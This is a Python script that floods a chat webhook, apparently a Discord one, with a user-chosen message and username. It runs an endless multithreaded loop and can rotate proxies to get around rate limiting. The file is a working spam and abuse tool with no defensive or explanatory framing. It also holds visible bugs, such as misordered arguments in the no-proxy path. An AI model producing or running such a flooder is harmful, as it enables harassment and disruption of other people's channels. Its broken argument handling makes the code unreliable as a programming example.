import requests
from modules import cprint
import colorama
from concurrent.futures import ThreadPoolExecutor, as_completed
import json

def get_proxies():
    with open("proxies.txt", 'r') as file:
        proxies = []
        for line in file:
            stripped_line = line.strip()
            if not stripped_line.startswith('#'):
                proxies.append(stripped_line)
        return proxies

def validate_webhook(webhook):
    response = requests.get(webhook)
    if response.status_code == 200:
        return True
    else:
        return False

def post_to_webhook(proxy=False, webhook=None, data=None, headers=None):
    if proxy == False:
        try:
            response = requests.post(webhook, data=json.dumps(data), headers=headers, timeout=5)
            if response.status_code == 204:
                cprint("Sent message to webhook.", 0)
            else:
                cprint("Webhook is being rate limited.", 1)
        except requests.exceptions.ProxyError:
            cprint(f"Proxy {proxy} failed.", 1)
        except requests.exceptions.ReadTimeout:
            cprint(f"Proxy {proxy} Timed out.", 1)
        except:
            cprint(f"Unknown Error: {proxy}", 1)
    else:
        try:
            response = requests.post(webhook, proxies={"http": proxy, "https": proxy}, data=json.dumps(data), headers=headers, timeout=4)
            if response.status_code == 204:
                cprint("Sent message to webhook.", 0)
            else:
                cprint("Webhook is being rate limited.")
        except requests.exceptions.ProxyError:
            cprint(f"Proxy {proxy} failed.", 1)
        except requests.exceptions.ReadTimeout:
            cprint(f"Proxy {proxy} Timed out.", 1)
        except:
            cprint(f"Unknown Error: {proxy}", 1)

def webhook_spammer():
    try:
        webhook = input(colorama.Fore.RESET + "Webhook URL: ")

        if validate_webhook(webhook) is False:
                cprint("Invalid Webhook\n", 1)
                webhook_spammer()

        use_proxies = input(colorama.Fore.RESET + "Use Proxies? (Y/N): ")
        max_threads = int(input("Max Threads (more threads = faster but harder on pc): "))
        username = input("Set username of webhook: ")
        message = input("Message to spam: ")
        data = {
            "content": message,
            "username": username
        }
        headers = {
            "Content-Type": "application/json"
        }
        print ("Spamming webhook. (CTRL + C to stop.)")
        try:
            if use_proxies.lower().strip() == "y":
                proxylist = get_proxies()
                if not proxylist:
                    cprint("ERROR: NO PROXIES IN PROXIES.TXT", 1)
                    webhook_spammer()

                else:
                    try:
                        while True:
                            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                                futures = [executor.submit(post_to_webhook, proxy, webhook, data, headers) for proxy in proxylist]
                                for future in as_completed(futures):
                                    future.result()
                    except KeyboardInterrupt:
                        return

            if use_proxies.lower().strip() == "n":
                try:
                    while True:
                        with ThreadPoolExecutor(max_workers=max_threads) as executor:
                            futures = [executor.submit(post_to_webhook, webhook, data, headers)]
                            for future in as_completed(futures):
                                future.result()
                except KeyboardInterrupt:
                    return

            else:
                cprint("ERROR: PLEASE CHOOSE EITHER Y OR N", 0)
                webhook_spammer()

        except KeyboardInterrupt:
            return
    except KeyboardInterrupt:
        return